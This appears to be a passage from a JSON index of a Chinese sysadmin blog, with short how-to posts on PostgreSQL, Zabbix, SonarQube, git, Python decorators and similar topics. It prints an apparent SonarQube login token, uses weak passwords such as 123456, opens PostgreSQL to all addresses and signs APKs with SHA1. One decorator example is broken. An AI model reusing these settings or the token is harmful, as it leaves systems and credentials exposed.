res = sr.keys() # print(res) # 获取所有以n开头的key # res = sr.keys('n*') # print(res) except Exception as e: print(e)","date":"2020-03-04 14:01","objectID":"/post/1467/:0:0","tags":["redis","python"],"title":"python操作redis","uri":"/post/1467/"},{"categories":["kubernetes"],"content":"修改配置文件 spec: containers: - name: envar-demo-container image: gcr.io/google-samples/node-hello:1.0 env: - name: JAVA_OPTS value: \"-Xms500m -Xmx950m -XX:MaxNewSize=250m -XX:+UseConcMarkSweepGC\"","date":"2020-03-03 17:32","objectID":"/post/1462/:0:0","tags":["k8s"],"title":"k8s使用env控制容器环境变量","uri":"/post/1462/"},{"categories":["其他"],"content":"1.安装jdk环境 https://soulchild.cn/470.html 2.安装android sdk wget https://dl.google.com/android/repository/sdk-tools-linux-3859397.zip mkdir -p /opt/android/sdk unzip sdk-tools-linux-3859397.zip -d /opt/android/sdk cd /opt/android/sdk/tools/bin/ ./sdkmanager “build-tools;27.0.3” “platforms;android-27” “platform-tools” “ndk-bundle” “extras;android;m2repository” “extras;google;m2repository” “extras;m2repository;com;android;support;constraint;constraint-layout;1.0.2” “tools” or ./sdkmanager –licenses 3.安装gradle wget https://services.gradle.org/distributions/gradle-5.1.1-all.zip mkdir /opt/gradle/ unzip gradle-5.1.1-all.zip -d /opt/gradle/ 配置环境变量 export ANDROID_HOME=/opt/android/sdk PATH=$PATH:$ANDROID_HOME:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools:$ANDROID_HOME/emulator:$ANDROID_HOME/tools/bin export PATH=$PATH:/opt/gradle/gradle-5.1.1/bin   4.生成签名文件 mkdir ~/keys cd ~/keys keytool -genkey -v -keystore dao_flashcard.keystore -alias flashcard -keyalg RSA -validity 20000 参数说明： 1）keytool是工具名称，-genkey意味着执行的是生成数字证书操作，-v表示将生成证书的详细信息打印出来 2）dao_flashcard.keystore表示生成的数字证书的文件名为“dao_flashcard.keystore”； 3）-alias flashcard表示证书的别名为“flashcard\"，当然可以不和上面的文件名一样； 4）-keyalg RSA 表示生成密钥文件所采用的算法为RSA； 5）-validity 20000 表示该数字证书的有效期为20000天，意味着20000天之后该证书将失效 5.构建apk包 cd /android_app/ gradle clean gradle assembleRelease cp app/build/outputs/apk/release/xxx.apk ~/keys 6.给apk签名 #apk和签名文件在同一目录 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore dao_flashcard.keystore -signedjar new.apk xxx.apk flashcard ","date":"2020-02-28 09:49","objectID":"/post/1458/:0:0","tags":[],"title":"gradle打包APK,并使用jarsigner签名","uri":"/post/1458/"},{"categories":["系统服务","databases"],"content":"create database database_name default character set utf8mb4 collate utf8mb4_unicode_ci; ","date":"2020-02-21 10:49","objectID":"/post/1456/:0:0","tags":["mysql"],"title":"mysql创建库utf8_mb4","uri":"/post/1456/"},{"categories":["系统服务","databases"],"content":" #指定数据文件目录 data_directory = '/data/postgresql/' #监听地址 listen_addresses = '*' #最大连接数 max_connections = 1000 查询sql：SELECT sum(numbackends) FROM pg_stat_database; #处理tcp连接 tcp_keepalives_idle = 0 tcp_keepalives_interval = 0 tcp_keepalives_count = 0 对于每个连接，postgresql会对这个连接空闲tcp_keepalives_idle秒后，主动发送tcp_keeplive包给客户 端，以侦探客户端是否还活着 ，当发送tcp_keepalives_count个侦探包，每个侦探包在tcp_keepalives_interval 秒内没有回应，postgresql就认为这个连接是死的。于是切断这个死连接。参数设置为o时，使用系统默认值。 对应关系： tcp_keepalives_idle == tcp_keepalive_time tcp_keepalives_interval == tcp_keepalives_interval tcp_keepalives_count == tcp_keepalive_probes #缓存大小 shared_buffers = 128MB #启动日志收集， 这是一个后台进程，抓取发送到stderr的日志消息，并会将他们重定向到日志文件。 logging_collector = on #日志类型,需要先开启logging_collector log_destination = 'stderr' #日志目录 log_directory = 'pg_log' #日志名 log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log' #当日志文件已存在时，该配置如果为off，新生成的日志将在文件尾部追加，如果为on，则会覆盖原来的日志。 log_truncate_on_rotation = off 单个日志文件的生存期，默认1天，在日志文件大小没有达到10M时，一天只生成一个日志文件 log_rotation_age = 7d 单个日志文件的大小，如果时间没有超过7天，一个日志文件最大只能到10M，否则将新生成一个日志文件。 log_rotation_size = 10MB #记录每条SQL语句执行完成消耗的时间 log_duration = on #-1表示不可用，0将记录所有SQL语句和它们的耗时，大于0只记录那些耗时超过（或等于）这个值（ms）的SQL语句。 log_min_duration_statement = 5000 #记录用户连接日志 log_connections = on #记录用户断开连接的日志 log_disconnections = on #配置日志格式 log_line_prefix = '\u003c %m %p %u %d %r \u003e' #控制记录哪些SQL语句。none不记录，ddl记录所有数据定义命令，比如CREATE,ALTER,和DROP 语句。mod记录所有ddl语句,加上数据修改语句INSERT,UPDATE等,all记录所有执行的语句，将此配置设置为all可跟踪整个数据库执行的SQL语句。 log_statement = 'ddl' #日志格式 datestyle = 'iso, mdy' #时区设置 log_timezone = 'Asia/Shanghai' ","date":"2020-02-21 09:27","objectID":"/post/1450/:0:0","tags":["postgresql","pgsql"],"title":"pgsql配置文件说明","uri":"/post/1450/"},{"categories":["python"],"content":"1.安装django框架 pip install django 2.创建一个项目 django-admin startproject test 3.创建一个APP cd test python startapp app01 修改settings.py 4.注册app01 INSTALLED_APPS添加app01 5.修改语言和时区 LANGUAGE_CODE = 'zh-hans' TIME_ZONE = 'Asia/Shanghai' # 不使用国际时间 USE_TZ = False 6.配置静态文件目录 # 文件末尾添加 STATICFILES_DIRS = [ os.path.join(BASE_DIR, \"static\") ] 7.配置静态文件的URL # 这个路径指的是浏览器中url中的路径，STATICFILES_DIRS是指python查找文件的路径 STATIC_URL = '/static/' ","date":"2020-02-19 18:05","objectID":"/post/1444/:0:0","tags":["python","django"],"title":"django-创建项目","uri":"/post/1444/"},{"categories":["docker"],"content":"懒病: docker run -d -p3306:3306 --name mysqld -e MYSQL_ROOT_PASSWORD=123456 -v /mysql-server/mysql-data/:/var/lib/mysql -v /mysql-server/mysql-conf/:/etc/mysql/conf.d mysql:5.7.20 ","date":"2020-02-14 11:43","objectID":"/post/2416/:0:0","tags":["mysql","docker"],"title":"docker快速运行mysql5.7.20","uri":"/post/2416/"},{"categories":["基础内容"],"content":"1、/etc/issue 本地登录前的显示 2、/etc/issue.net 使用网络登陆前显示 3、/etc/motd 登陆后显示 \\d //本地端时间的日期； \\l //显示当前tty的名字即第几个tty； \\m //显示硬体的架构 (i386/i486/i586/i686...)； \\n //显示主机的网路名称； \\o //显示 domain name； \\r //当前系统的版本 (相当于 uname -r) \\t //显示本地端时间的时间； \\u //当前有几个用户在线。 \\s //当前系统的名称； \\v //当前系统的版本。 ","date":"2020-02-13 22:46","objectID":"/post/1435/:0:0","tags":[],"title":"linux登陆提示信息","uri":"/post/1435/"},{"categories":["系统服务","databases"],"content":" #创建用户角色 CREATE USER user_name WITH PASSWORD '123456'; #创建数据库设置所有者 CREATE DATABASE database_name OWNER user_name; #将database_name数据库授权给user_name用户 GRANT ALL PRIVILEGES ON DATABASE database_nname TO user_name;","date":"2020-02-11 13:06","objectID":"/post/1432/:0:0","tags":["postgresql","pgsql"],"title":"pgsql创建库、用户、授权","uri":"/post/1432/"},{"categories":["python"],"content":"1、 str__和__repr 当使用print打印对象时，str方法的返回值就是print的结果。（repr和str类似，__str__是面向用户的，而__repr__面向程序员） 2、del __del__在对象销毁的时候被调用. ","date":"2020-02-08 22:51","objectID":"/post/1429/:0:0","tags":["python"],"title":"python_类的内置方法","uri":"/post/1429/"},{"categories":["基础内容","常用命令"],"content":"创建虚拟内存设备（2g） mkdir /swap dd if=/dev/zero of=/swap/swap2g bs=1024k count=2000 mkswap /swap/swap2g chmod 600 /swap/swap2g swapon /swap/swap2g 查看swap分区信息 swapon -s cat /proc/swaps ","date":"2020-02-06 19:14","objectID":"/post/1425/:0:0","tags":[],"title":"启用虚拟内存swap","uri":"/post/1425/"},{"categories":["其他","基础内容"],"content":"参数说明： clean：清除上一次的构建 package：仅打包、测试 install：把打好的包发布至本地仓库，以备本地的其它项目作为依赖使用 deploy：把打好的包发布至本地仓库和远程仓库 -U：强制更新snapshot类型的插件或依赖库 -pl：手动指定构建模块，模块间以逗号分隔 -am：自动构建指定模块的依赖模块 -T：线程计数，例如-T 2C，其中C是核心数，两者相乘即为总线程数 -Dmaven.compile.fork=true：使用多线程编译 -Dmaven.test.skip=true：跳过测试代码的编译 指定模块编译： mvn -U -pl blade-service/xxxx -am clean package 加速编译： mvn clean install -T 1C -Dmaven.compile.fork=true -Dmaven.test.skip=true 完整编译参数： mvn clean package -U -pl xxx-service/xxxx -am -T 2C -Dmaven.compile.fork=true","date":"2020-02-06 02:31","objectID":"/post/1417/:0:0","tags":["maven"],"title":"maven命令编译常用参数","uri":"/post/1417/"},{"categories":["python"],"content":"OS模块 os.getcwd() 获取当前工作目录，即当前python脚本工作的目录路径 os.chdir(\"dirname\") 改变当前脚本工作目录；相当于shell下cd os.curdir 返回当前目录: ('.') os.pardir 获取当前目录的父目录字符串名：('..') os.makedirs('dirname1/dirname2') 可生成多层递归目录 os.removedirs('dirname1') 若目录为空，则删除，并递归到上一级目录，如若也为空，则删除，依此类推 os.mkdir('dirname') 生成单级目录；相当于shell中mkdir dirname os.rmdir('dirname') 删除单级空目录，若目录不为空则无法删除，报错；相当于shell中rmdir dirname os.listdir('dirname') 列出指定目录下的所有文件和子目录，包括隐藏文件，并以列表方式打印 os.remove() 删除一个文件 os.rename(\"oldname\",\"newname\") 重命名文件/目录 os.stat('path/filename') 获取文件/目录信息 os.sep 输出操作系统特定的路径分隔符，win下为\"\\\\\",Linux下为\"/\" os.linesep 输出当前平台使用的行终止符，win下为\"\\r\\n\",Linux下为\"\\n\" os.pathsep 输出用于分割文件路径的字符串 win下为;,Linux下为: os.name 输出字符串指示当前使用平台。win-\u003e'nt'; Linux-\u003e'posix' os.system(\"bash command\") 运行shell命令，直接显示 os.environ 获取系统环境变量 os.path.abspath(path) 返回path规范化的绝对路径 os.path.split(path) 将path分割成目录和文件名二元组返回 os.path.dirname(path) 返回path的目录。其实就是os.path.split(path)的第一个元素 os.path.basename(path) 返回path最后的文件名。如何path以／或\\结尾，那么就会返回空值。即os.path.split(path)的第二个元素 os.path.exists(path) 如果path存在，返回True；如果path不存在，返回False os.path.isabs(path) 如果path是绝对路径，返回True os.path.isfile(path) 如果path是一个存在的文件，返回True。否则返回False os.path.isdir(path) 如果path是一个存在的目录，则返回True。否则返回False os.path.join(path1[, path2[, ...]]) 将多个路径组合后返回，第一个绝对路径之前的参数将被忽略 os.path.getatime(path) 返回path所指向的文件或者目录的最后存取时间 os.path.getmtime(path) 返回path所指向的文件或者目录的最后修改时间 os.path.getsize(path) 返回path的大小","date":"2020-02-02 01:31","objectID":"/post/1414/:0:0","tags":["python"],"title":"python常用模块","uri":"/post/1414/"},{"categories":["监控"],"content":"安装zabbix-agent rpm -ivh https://mirrors.tuna.tsinghua.edu.cn/zabbix/zabbix/4.0/rhel/7/x86_64/zabbix-agent-4.0.16-1.el7.x86_64.rpm 主要修改： Server：zabbix-server地址 ServerActive：主动模式zabbix-server地址 Hostname：主机名 HostMetadata：元数据 vim /etc/zabbix/zabbix_agentd.conf Server=192.168.0.200 ServerActive=192.168.0.200 Hostname=web-01 HostMetadata=web systemctl restart zabbix-agent 配置zabbix 1.创建 \u003cimg src=“images/fa79c23467e5c3784b105fc3f71c5014.png “fa79c23467e5c3784b105fc3f71c5014\"” /\u003e \u003cimg src=“images/fc87734b378a828dc95d1a7a7348c0b1.png “fc87734b378a828dc95d1a7a7348c0b1\"” /\u003e \u003cimg src=“images/63f4d185a36f289c3da0b5f4a00941f5.png “63f4d185a36f289c3da0b5f4a00941f5\"” /\u003e 配置完后，重启agent即可。 ","date":"2020-01-16 17:59","objectID":"/post/1408/:0:0","tags":["zabbix"],"title":"zabbix通过自动注册创建主机","uri":"/post/1408/"},{"categories":["监控"],"content":"安装zabbix-agent rpm -ivh https://mirrors.tuna.tsinghua.edu.cn/zabbix/zabbix/4.0/rhel/7/x86_64/zabbix-agent-4.0.16-1.el7.x86_64.rpm sed -i s#^Server=.*#Server=zabbix-server地址# /etc/zabbix/zabbix_agentd.conf systemctl restart zabbix-agent 配置zabbix 1.创建自动发现规则 \u003cimg src=“images/b4136209d26a84d627453151f2b55357.png “b4136209d26a84d627453151f2b55357\"” /\u003e 修改IP范围和检查条件 \u003cimg src=“images/d6b3a5d62346d21ee7c35b8a016a897f.png “d6b3a5d62346d21ee7c35b8a016a897f”” /\u003e 2.创建自动发现动作 \u003cimg src=“images/65be28dda5bff1b8eddc49a5e88b6998.png “65be28dda5bff1b8eddc49a5e88b6998\"” /\u003e 添加执行动作条件 \u003cimg src=“images/4394046a1372067219f35db56a954fc2.png “4394046a1372067219f35db56a954fc2\"” /\u003e 配置执行动作 \u003cimg src=“images/1532bd32d5c765c8f799defd5602b99c.png “1532bd32d5c765c8f799defd5602b99c”” /\u003e ","date":"2020-01-16 17:05","objectID":"/post/1405/:0:0","tags":["zabbix"],"title":"zabbix通过自动发现创建主机","uri":"/post/1405/"},{"categories":["其他","系统服务"],"content":"cd /server/packages/php-5.6.40/ext/gettext /server/packages/php-5.6.40/ext/gettext /application/php/bin/phpize ./configure –with-php-config=/application/php5.6.40/bin/php-config make \u0026\u0026 make install 在;Dynamic Extensions部分下面添加模块 vim /application/php/etc/php.ini extension=gettext.so ","date":"2020-01-16 11:22","objectID":"/post/1399/:0:0","tags":["php"],"title":"php编译扩展","uri":"/post/1399/"},{"categories":["监控"],"content":"下载地址： https://nchc.dl.sourceforge.net/project/zabbix/ZABBIX%20Latest%20Stable/4.0.16/zabbix-4.0.16.tar.gz 解压安装： tar xf zabbix-4.0.16.tar.gz groupadd zabbix useradd -g zabbix zabbix yum install -y net-snmp net-snmp-devel libevent libevent-devel ./configure –prefix=/application/zabbix –enable-server –enable-agent –with-mysql –enable-ipv6 –with-net-snmp –with-libcurl –with-libxml2 make install echo ’export PATH=/application/zabbix/sbin:$PATH’ \u003e\u003e /etc/profile 配置mysql： create database zabbix character set utf8 collate utf8_bin; grant all privileges on zabbix.* to ‘zabbix’@’localhost’ identified by ‘\u003cpassword\u003e’; 导入库： cd /server/packages/zabbix-4.0.16/frontends/phpdatabase/mysql mysql -uzabbix -p\u003cpassword\u003e zabbix \u003c schema.sql 下面步骤当创建Zabbix proxy数据库时不需要执行 mysql -uzabbix -p\u003cpassword\u003e zabbix \u003c images.sql mysql -uzabbix -p\u003cpassword\u003e zabbix \u003c data.sql 配置zabbix_server vim /application/zabbix/etc/zabbix_server.conf DBName=zabbix DBUser=zabbix DBUser=zabbix 启动zabbix_server(agent同理) su - zabbix -c zabbix_server 安装zabbix_web /server/packages/zabbix-4.0.16/frontends/php cp -a /application/zabbix_web 打开浏览器安装 zabbix-server启动脚本 [Unit] Description=zabbix server After=syslog.target network.target [Service] Type=simple PIDFile=/tmp/zabbix_server.pid ExecStart=/application/zabbix/sbin/zabbix_server ExecReload=/bin/kill -USR2 $MAINPID ExecStop=/bin/kill -SIGTERM $MAINPID [Install] WantedBy=multi-user.target","date":"2020-01-16 11:04","objectID":"/post/1395/:0:0","tags":["zabbix"],"title":"zabbix4.0编译安装","uri":"/post/1395/"},{"categories":["监控"],"content":"官方文档： https://www.zabbix.com/documentation/4.0/zh/manual/installation/install Optional Packages: --with-PACKAGE[=ARG] use PACKAGE [ARG=yes] --without-PACKAGE do not use PACKAGE (same as --with-PACKAGE=no) --with-ibm-db2[=ARG] use IBM DB2 CLI from given sqllib directory (ARG=path); use /home/db2inst1/sqllib (ARG=yes); disable IBM DB2 support (ARG=no) --with-ibm-db2-include[=DIR] use IBM DB2 CLI headers from given path --with-ibm-db2-lib[=DIR] use IBM DB2 CLI libraries from given path --with-mysql[=ARG] use MySQL client library [default=no], optionally specify path to mysql_config --with-oracle[=ARG] use Oracle OCI API from given Oracle home (ARG=path); use existing ORACLE_HOME (ARG=yes); disable Oracle OCI support (ARG=no) --with-oracle-include[=DIR] use Oracle OCI API headers from given path --with-oracle-lib[=DIR] use Oracle OCI API libraries from given path --with-postgresql[=ARG] use PostgreSQL library [default=no], optionally specify path to pg_config --with-sqlite3[=ARG] use SQLite 3 library [default=no], optionally specify the prefix for sqlite3 library If you want to use Jabber protocol for messaging: --with-jabber[=DIR] Include Jabber support [default=no]. DIR is the iksemel library install directory. If you want to use XML library: --with-libxml2[=ARG] use libxml2 client library [default=no], optionally specify path to xml2-config If you want to use unixODBC library: --with-unixodbc[=ARG] use ODBC driver against unixODBC package [default=no], optionally specify full path to odbc_config binary. If you want to use Net-SNMP library: --with-net-snmp[=ARG] use Net-SNMP package [default=no], optionally specify path to net-snmp-config If you want to use SSH2 based checks: --with-ssh2[=DIR] use SSH2 package [default=no], DIR is the SSH2 library install directory. If you want to check IPMI devices: --with-openipmi[=DIR] Include OPENIPMI support [default=no]. DIR is the OPENIPMI base install directory, default is to search through a number of common places for the OPENIPMI files. If you want to specify zlib installation directories: --with-zlib=DIR use zlib from given base install directory (DIR), default is to search through a number of common places for the zlib files. --with-zlib-include=DIR use zlib include headers from given path. --with-zlib-lib=DIR use zlib libraries from given path. If you want to specify pthread installation directories: --with-libpthread[=DIR] use libpthread from given base install directory (DIR), default is to search through a number of common places for the libpthread files. --with-libpthread-include[=DIR] use libpthread include headers from given path. --with-libpthread-lib[=DIR] use libpthread libraries from given path. If you want to specify libevent installation directories: --with-libevent[=DIR] use libevent from given base install directory (DIR), default is to search through a number of common places for the libevent files. --with-libevent-include[=DIR] use libevent include headers from given path. --with-libevent-lib[=DIR] use libevent libraries from given path. If you want to use encryption provided by mbed TLS (PolarSSL) library: --with-mbedtls[=DIR] use mbed TLS (PolarSSL) package [default=no], DIR is the libpolarssl install directory. If you want to use encryption provided by GnuTLS library: --with-gnutls[=DIR] use GnuTLS package [default=no], DIR is the libgnutls install directory. If you want to use encryption provided by OpenSSL library: --with-openssl[=DIR] use OpenSSL package [default=no], DIR is the libssl and libcrypto install directory. If you want to check LDAP servers: --with-ldap[=DIR] Include LDAP support [default=no]. DIR is the LDAP base install directory, default is to search through a number of common places for the LDAP files. If you want to use cURL library: --with-libcurl[=DIR] use cURL package [default=no], optionally specify path to curl-config If you want to specify libpcre installation directories: --with-libpcre[=DIR] use libpcre from given base install directory","date":"2020-01-16 10:17","objectID":"/post/1392/:0:0","tags":["zabbix"],"title":"zabbix4.0编译安装参数","uri":"/post/1392/"},{"categories":["python"],"content":"vi ~/.pip/pip.conf [global] trusted-host = mirrors.aliyun.com index-url = https://mirrors.aliyun.com/pypi/simple 1、http://mirrors.aliyun.com/pypi/simple/ 2、http://pypi.douban.com/simple/ 3、https://pypi.tuna.tsinghua.edu.cn/simple/ 4、http://pypi.mirrors.ustc.edu.cn/simple/ ","date":"2020-01-16 09:17","objectID":"/post/1389/:0:0","tags":["python"],"title":"pip源加速修改","uri":"/post/1389/"},{"categories":["系统服务","databases"],"content":"认证方式说明： https://www.postgresql.org/docs/9.4/auth-methods.html 修改： vim /data/postgresql/pg_hba.conf IPv4 local connections: host all all 0.0.0.0/0 md5 vim /data/postgresql/postgresql.conf listen_addresses = ‘*’ 重启服务： pg_ctl stop -D /data/postgresql/ -s -m fast pg_ctl start -D /data/postgresql/ -s -w -t 300 ","date":"2020-01-15 11:35","objectID":"/post/1385/:0:0","tags":["postgresql","pgsql"],"title":"pgsql 设置监听地址提供外部访问","uri":"/post/1385/"},{"categories":["系统服务","databases"],"content":"下载二进制包： wget http://get.enterprisedb.com/postgresql/postgresql-9.4.25-1-linux-x64-binaries.tar.gz 创建目录： mkdir /application/ mkdir /data/postgresql 添加用户： useradd postgres chown -R postgres.postgres /data/postgresql/ 解压： tar xf postgresql-9.4.25-1-linux-x64-binaries.tar.gz -C /application/ echo 'export PATH=$PATH:/application/pgsql/bin/' \u003e\u003e /etc/profile source /etc/profile 使用postgres用户初始化数据库： su postgres initdb -D /data/postgresql/ 修改配置文件 data_directory = '/data/postgresql/' listen_addresses = '127.0.0.1,10.0.0.92' max_connections = 1000 logging_collector = on log_destination = 'stderr' log_directory = 'pg_log' log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log' # 当日志文件已存在时,使用追加的方式写日志 log_truncate_on_rotation = off log_rotation_age = 1d log_rotation_size = 10MB log_duration = on log_min_duration_statement = 4000 log_connections = on log_disconnections = on # 日志前缀: \u003c 日期 进程id 用户名 数据库名称 远程主机端口 连接应用\u003e log_line_prefix = '\u003c %m %p %u %d %r %a \u003e' log_statement = 'ddl' datestyle = 'iso, mdy' log_timezone = 'Asia/Shanghai' 启动服务： cd /data/postgresql pg_ctl -D /data/postgresql/ start 连接数据库： psql -U postgres 修改密码： ALTER USER postgres with encrypted password '密码'; 创建用户和库 postgres=# create user 用户名 with password '123'; postgres=# create database 库名 with encoding='utf8' owner=用户名; 开启、停止、重启： #Start pg_ctl start -D ${PGDATA} -s -w -t 300 #Stop pg_ctl stop -D ${PGDATA} -s -m fast #Reload pg_ctl reload -D ${PGDATA} -s systemd管理 [Unit] Description=PostgreSQL 9.4 database server Documentation=https://www.postgresql.org/docs/9.4/static/ After=syslog.target After=network.target [Service] Type=forking User=postgres Group=postgres # Note: avoid inserting whitespace in these Environment= lines, or you may # break postgresql-setup. # Location of database directory Environment=PGDATA=/data/postgresql/ # Where to send early-startup messages from the server (before the logging # options of postgresql.conf take effect) # This is normally controlled by the global default set by systemd # StandardOutput=syslog # Disable OOM kill on the postmaster OOMScoreAdjust=-1000 ExecStartPre=/application/pgsql/bin/postgresql94-check-db-dir ${PGDATA} ExecStart=/application/pgsql/bin/pg_ctl start -D ${PGDATA} -s -w -t 300 ExecStop=/application/pgsql/bin/pg_ctl stop -D ${PGDATA} -s -m fast ExecReload=/application/pgsql/bin/pg_ctl reload -D ${PGDATA} -s # Do not set any timeout value, so that systemd will not kill postmaster # during crash recovery. TimeoutSec=0 [Install] WantedBy=multi-user.target ","date":"2020-01-15 10:44","objectID":"/post/1373/:0:0","tags":["postgresql","pgsql"],"title":"pgsql9.4二进制安装","uri":"/post/1373/"},{"categories":["基础内容","常用命令"],"content":"kill：根据进程号 pkill：根据进程名（模糊匹配）pkill sh 会把sshd也kill掉 killall：根据进程名 ","date":"2020-01-14 11:21","objectID":"/post/1371/:0:0","tags":[],"title":"kill三人组","uri":"/post/1371/"},{"categories":["kubernetes"],"content":"https://www.cnblogs.com/linuxk/p/9578211.html ","date":"2020-01-14 10:56","objectID":"/post/1369/:0:0","tags":["k8s"],"title":"k8s yaml参数","uri":"/post/1369/"},{"categories":["kubernetes"],"content":"journalctl -u kubelet.service -f test-k8s-node3 kubelet[10533]: W0114 10:24:01.970016 10533 eviction_manager.go:160] Failed to admit pod kube-flannel-ds-amd64-6hwz9_kube-system(eda94251-3674-11ea-be8c-fa163e30703c) - node has conditions: [DiskPressure] 由此看出应该和硬盘有关系 df -h 清理出空间后就恢复正常了 https://my.oschina.net/xiaominmin/blog/1944054?spm=a2c4e.10696291.0.0.6fa919a4mLW72v ","date":"2020-01-14 10:45","objectID":"/post/1366/:0:0","tags":["k8s"],"title":"k8s调度node失败","uri":"/post/1366/"},{"categories":["其他","基础内容"],"content":"-s ours 该参数将强迫冲突发生时，自动使用当前分支的版本。这种合并方式不会产生任何困扰情况，甚至git都不会去检查其他分支版本所包含的冲突内容这种方式会抛弃对方分支任何冲突内容。 使用dev分支替换master分支 git checkout dev git merge -s ours master git checkout master git merge dev git push origin master 恢复上一步的过程 1.git reset –hard 73a828895ad167339752c3fbba2be3564cdbdfa7 2.关闭master分支保护 3.git push origin master –force ","date":"2020-01-03 17:53","objectID":"/post/1340/:0:0","tags":["git"],"title":"git使用其他分支替换master分支","uri":"/post/1340/"},{"categories":["其他","基础内容"],"content":"设置记住密码（默认15分钟） git config --global credential.helper cache 自定义时间（1小时） git config credential.helper 'cache --timeout=3600' 添加全局记住账号密码 git config --global credential.helper store 密码发生改变后重置密码 git config --system --unset credential.helper ","date":"2020-01-03 17:49","objectID":"/post/1337/:0:0","tags":["git"],"title":"git记住账号密码","uri":"/post/1337/"},{"categories":["系统服务"],"content":"1.安装mysql5.7 2.启动数据库，配置密码，并创建一个sonar库 vim /etc/my.cnf max_allowed_packet = 64M systemctl start mysqld mysqladmin password 123456 mysql -uroot -p123456 -e \"CREATE DATABASE sonar DEFAULT CHARACTER SET utf8;\" mysql -uroot -p123456 -e \"show databases;\" 3.安装sonarqube wget https://binaries.sonarsource.com/Distribution/sonarqube/sonarqube-7.0.zip unzip sonarqube-7.0.zip -d /usr/local/ useradd sonar -M -s /sbin/nologin chown -R sonar.sonar /usr/local/sonarqube-7.0/ ln -s /usr/local/sonarqube-7.0/ /usr/local/sonarqube 4.修改sonar配置文件 vim /usr/local/sonarqube/conf/sonar.properties sonar.jdbc.username=root sonar.jdbc.password=123456 sonar.jdbc.url=jdbc:mysql://localhost:3306/sonar?useUnicode=true\u0026characterEncoding=utf8\u0026rewriteBatchedStatements=true\u0026useConfigs=maxPerformance\u0026useSSL=false 5.启动sonar su -s /bin/bash - sonar -c /usr/local/sonarqube/bin/linux-x86-64/sonar.sh start 6.访问 http://IP:9000/ 用户名密码：admin 7.生成token令牌 \u003cimg src=“images/34f4e2196f2d98b18467c0e4bf59148a.png “34f4e2196f2d98b18467c0e4bf59148a”” /\u003e gitlab: c8f7808f87bf63f857707fba1b571cf53debe8e7 8.手动检测，-Dsonar.projectKey=html指定关键字 #maven mvn sonar:sonar \\ -Dsonar.host.url=http://10.0.0.51:9000 \\ -Dsonar.login=c8f7808f87bf63f857707fba1b571cf53debe8e7 #html sonar-scanner \\ -Dsonar.projectKey=html \\ -Dsonar.sources=. \\ -Dsonar.host.url=http://10.0.0.51:9000 \\ -Dsonar.login=c8f7808f87bf63f857707fba1b571cf53debe8e7 #js sonar-scanner \\ -Dsonar.projectKey=js \\ -Dsonar.projectName=js项目 \\ -Dsonar.sources=. \\ -Dsonar.host.url=http://10.0.0.51:9000 \\ -Dsonar.login=c8f7808f87bf63f857707fba1b571cf53debe8e7 ","date":"2020-01-01 11:23","objectID":"/post/1331/:0:0","tags":["maven"],"title":"sonarqube记录","uri":"/post/1331/"},{"categories":["其他","基础内容"],"content":"java -Dspring.profiles.active=test -jar xxx.jar ","date":"2019-12-31 11:26","objectID":"/post/1326/:0:0","tags":["java"],"title":"springboot指定jar包运行环境","uri":"/post/1326/"},{"categories":["python"],"content":"装饰器原则： 1.不改变原有代码 2.不改变调用方式 3.不改变原函数返回值 ","date":"2019-12-30 18:29","objectID":"/post/1320/:1:0","tags":["python"],"title":"python-装饰器","uri":"/post/1320/"},{"categories":["python"],"content":"例如： 一个普通的函数 import time def web(s): time.sleep(2) print(s) ","date":"2019-12-30 18:29","objectID":"/post/1320/:2:0","tags":["python"],"title":"python-装饰器","uri":"/post/1320/"},{"categories":["python"],"content":"一、 下面用装饰器实现计算此函数的运行时间 def timer(f): def inner(*args, **kwargs): start = time.time() result = f(*args, **kwargs) end = time.time() print(\"{}函数执行了{}s.\".format(f.__name__, stop - start)) return result return inner @timer # 相当于web=timer(web) def web(s): time.sleep(2) print(s) return True print(web('哒哒哒哒哒哒')) # 相当于执行inner('哒哒哒哒哒哒') 上面的装饰器本身是没有参数的，下面我我们定义一个有参数的装饰器 ","date":"2019-12-30 18:29","objectID":"/post/1320/:2:1","tags":["python"],"title":"python-装饰器","uri":"/post/1320/"},{"categories":["python"],"content":"二、 在调用装饰器的时候获取指定单位的时间 import time def timer(unit=\"s\"): def wrapper(f): def inner(*args, **kwargs): start = time.time() result = f(*args, **kwargs) stop = time.time() exec_time = stop - start if unit == 's': print(\"{}函数执行了{}s.\".format(f.__name__, int(exec_time))) elif unit == 'ms': print(\"{}函数执行了{:.1f}ms.\".format(f.__name__, exec_time * 1000)) return result return inner return wrapper @timer(unit='ms') # timer(unit='ms')执行结果是wrapper,相当于@wrapper,然后就是web=wrapper(web).web=inner def web(s): time.sleep(2) print(s) return True print(web('哒哒哒哒哒哒')) # inner('哒哒哒哒哒哒'),inner的父级函数有unit这个参数，所以可以实现显示不同单位的时间 上面的装饰器基本没有什么大问题了，但是函数是有它的属性的，比如__name__、doc。我们可以使用下面的方式修改 import time from functools import wraps # 导入模块 def timer(unit=\"s\"): def wrapper(f): @wraps(f) # 在内部的函数中使用wraps装饰器就可以了 def inner(*args, **kwargs): start = time.time() result = f(*args, **kwargs) stop = time.time() exec_time = stop - start if unit == 's': print(\"{}函数执行了{}s.\".format(f.__name__, int(exec_time))) elif unit == 'ms': print(\"{}函数执行了{:.1f}ms.\".format(f.__name__, exec_time * 1000)) return result return inner return wrapper @timer(unit='ms') # timer(unit='ms')执行结果是wrapper,相当于@wrapper,然后就是web=wrapper(web).web=inner def web(s): time.sleep(2) print(s) return True print(web('哒哒哒哒哒哒')) # inner('哒哒哒哒哒哒'),inner的父级函数有unit这个参数，所以可以实现显示不同单位的时间 ","date":"2019-12-30 18:29","objectID":"/post/1320/:2:2","tags":["python"],"title":"python-装饰器","uri":"/post/1320/"},{"categories":["基础内容"],"content":"添加 ip addr add 10.0.0.3/24 dev eth0 删除 ip addr del 10.0.0.3/24 dev eth0 ","date":"2019-12-25 16:32","objectID":"/post/1318/:0:0","tags":[],"title":"centos为网卡添加虚拟ip","uri":"/post/1318/"},{"categories":["系统服务"],"content":"原文链接：https://blog.csdn.net/ccschan/article/details/88095448 user nobody nobody; ## 指定运行用户和组 worker_processes 4; ## 指定worker数量，建议此处auto worker_rlimit_nofile 51200; ## 最大打开文件描述符 error_log logs/error.log notice; pid /var/run/nginx.pid; events { use epoll; ## 使用epoll事件驱动模型 worker_connections 51200; ## 一个worker能处理的最大并发 } http { server_tokens off; ## 隐藏nginx版本 include mime.types; proxy_redirect off; ## 